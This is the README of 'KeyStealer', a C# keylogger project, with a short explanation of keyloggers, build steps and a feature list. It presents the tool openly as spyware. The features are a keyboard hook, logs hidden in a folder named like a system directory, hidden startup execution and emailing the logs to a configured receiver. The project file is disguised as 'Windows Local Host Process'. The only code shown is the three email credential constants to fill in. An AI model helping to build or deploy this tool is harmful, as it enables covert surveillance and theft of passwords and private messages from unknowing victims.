# KeyStealer
A basic keylogger written in C#

~Originally written for HighTechLowLife.eu

## What?
A keylogger is a type of surveillance software (considered to be either software or spyware) that has the capability to record every keystroke you make to a log file, usually encrypted. A keylogger recorder can record instant messages, e-mail, and any information you type at any time using your keyboard. The log file created by the keylogger can then be sent to a specified receiver. Some keylogger programs will also record any e-mail addresses you use and Web site URLsyou visit.

Keyloggers, as  a surveillance tool, are often used by employers to ensure employees use work computers for business purposes only. Unfortunately, keyloggers can also be embedded in spyware allowing your information to be transmitted to an unknown third party.

## How?

Assuming you have Microsoft Visual Studio Community Edition 2013 (http://go.microsoft.com/fwlink/?LinkId=517284)

- Open the project's solution ("Windows Local Host Process.sln")
- Click "Project" > "Add new references".
- Select "System.Windows.Forms" in the Assemblies section
- Select "Windows Script Host Model" in the COM section
- Tick OK
- Change the following constant to match real addresses and password in program.cs
````
    private const string senderEmail = "fakemail@gmail.com";
    private const string receiverEmail = "realmail@yourdomain.com";
    private const string senderPassword = "P4s5w0rd";
````

## Features

Here are the actual and future features of KeyStealer

- [x] Hooking Windows LowLevelKeyboardProc to intercept every keystrokes
- [x] Logging the keys in a "nice" format to %appdata%\SysWin32\
- [x] Run hidden and at startup
- [x] Send mail to the desired address
- [ ] Encrypt/compress logs
- [ ] GUI to configure the keylogger
- [ ] Add support for other transfert protocols
- [ ] Add configurable screenshot/pictures
